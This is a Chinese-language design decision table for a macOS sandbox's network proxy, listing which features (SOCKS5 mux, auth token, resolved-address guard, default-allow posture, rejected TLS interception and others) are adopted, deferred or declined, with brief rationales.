| CONNECT + 明文转发 + SOCKS5 单端口 mux | 采纳 | 协议面最小完备集 |
| proxy auth token | 采纳（含威胁模型如实标注） | confused-deputy 防护；不防沙箱内跨 workspace 冒用（§4.1.3） |
| SOCKS5 no-auth | 采纳但加保守策略 | srt 探针只拒绝不放行；loom no-auth 限定全局显式 allow 集合 |
| resolved-address guard（含 NAT64/6to4、本机地址、云 metadata） | 采纳 + IP 字面量判定修正 | loom 的 unmatched=allow 姿态要求字面量也过禁类集合 |
| NO_PROXY 含私网、不含 `*.local` | 采纳 | 直连 fail-closed，`.local` 走代理由宿主解析 |
| trustd 放行（macOS Go TLS） | 采纳 | Go 生态刚需，风险存档（§5.2-1） |
| unmatched 默认姿态 | 默认 allow（可配 deny） | srt 默认 deny（allowlist 姿态）；loom 的用户诉求是 ambient 网络 + 黑名单 |
| TLS MITM / 凭证掩码 / body 替换 / SigV4 重签 | 不采纳 | CA 管理复杂度换路径级可见性，当前不需要 |
| 连接级交互审批（SandboxAskCallback） | 后续候选 | v1 静态规则先行 |
| GIT_SSH_COMMAND（SOCKS 走 ssh） | 不采纳 | 沙箱内 `~/.ssh` 不可读 |
| javaagent（JVM 代理注入） | 后续候选 | 遇到真实场景再做 |
| seatbelt 违规 `log stream` 监控 | 不采纳 | proxy 日志已覆盖网络维度 |
| parent proxy / 双亲代理 | 不采纳 | 无企业代理场景 |
| Linux bubblewrap | 留空 | 平台范围限定 macOS |
